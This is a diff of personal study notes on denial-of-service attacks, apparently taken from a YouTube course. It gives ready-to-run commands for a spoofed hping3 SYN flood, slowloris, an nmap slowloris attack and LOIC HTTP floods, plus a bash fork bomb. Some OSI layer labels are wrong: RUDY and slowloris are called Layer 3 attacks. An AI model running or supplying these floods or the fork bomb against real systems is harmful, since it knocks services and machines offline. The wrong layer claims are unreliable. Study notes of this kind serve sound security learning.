@@ -105,7 +105,7 @@ python3 golden_eye.py “http://example.com”
 Tool: RUDY (R U Dead Yet?) 
 Layer: Network Layer (Layer 3)
 >Open many connections
->Send packets that will take the longest amount of time to process, to keep the server busy.
+>Send packets that will take the longest amount of time to process, our goal is to send Requests to keep the server busy for the longest time possible. 
 >Send small packets (1Byte) every 10 seconds
 #### Install:
 ```
@@ -151,10 +151,69 @@ Similar to the DNS Amplification, this time the attacker will target a vulnerabl
 
 
 ### TCP & SYN Flood
+[Lesson 64](https://www.youtube.com/watch?v=fIxk4tkhOFE&ab_channel=NetCatTest) #TCPFlood #SynFlood
 **Layer:** Transport Layer (Layer 4)
 **Tool:** Hping3
+![[Pasted image 20250309204648.png]]
 #### Execute:
 ```
 hping3 -a <spoof_IP> -p 80 --flood -S <target> --fast
 ```
+
+### HTTP Flood
+[Lesson 65](https://www.youtube.com/watch?v=F9UoHy4rX4I&ab_channel=NetCatTest)
+Tool: **LOIC**
+Layer: **Application Layer (Layer 7)**
+![[Pasted image 20250309205900.png]]
+- HTTP Floods can be done using (**GET** | **POST**)
+>The goal is to make the target IP run out of resources to process the requests.
+- One type of attack is sending as many connections as possible, to take as many time as possible to process #slowloris
+- Open as many TCP connections as possible to make the server run out of open ports to connect, similar to #TCPFlood
+- Send many requests to download a large file from the server, this will cause the server to use **bandwidth**
+#### Install:
+> [Download LOIC](https://www.monodevelop.com/download/#fndtn-download-lin-debian) from SourceForge for Windows
+> Also available on Kali but requires more steps to install
+
+
+### HTTP Slowloris
+Tool: [slowloris](https://github.com/gkbrk/slowloris.git)
+Layer: **Network Layer (Layer 3)**
+![[Pasted image 20250309214719.png]]
+>Open many connections
+>Send packets that will take the longest amount of time to process, our goal is to send Requests to keep the server busy for the longest time possible. 
+#### Install
+```
+git clone https://github.com/gkbrk/slowloris.git
+```
+#### Execute
+```
+python3 slowloris.py $target -s 500
+```
+
+### Nmap Slowloris
+Alternatively we can use #nmap Script Engine to **check if server is vulnerable** or to **perform the SlowLoris attack** on the server
+- [Check if vulnerable to Slowloris](https://nmap.org/nsedoc/scripts/http-slowloris-check.html)
+```
+sudo nmap --script http-slowloris --max-parallelism 400  192.168.0.34 -p 80 -v
+```
+
+
+### Fork Bomb
+[Lesson 67](https://www.youtube.com/watch?v=dlF4K9cRkts&ab_channel=NetCatTest)
+![[Pasted image 20250309230820.png]]
+This is a function that will spawn other **children functions** which will eat all the resources of the system
+
+#### Execute:
+```
+#This can be done with any ForLoop();
+```
+#### Example
+```
+:(){:|:&};:
+```
+
+
+### UDP Flood
+
+
 Referece:[NetCat Test Youtube Channel](https://www.youtube.com/watch?v=Priw-LhMJDU&ab_channel=NetCatTest)
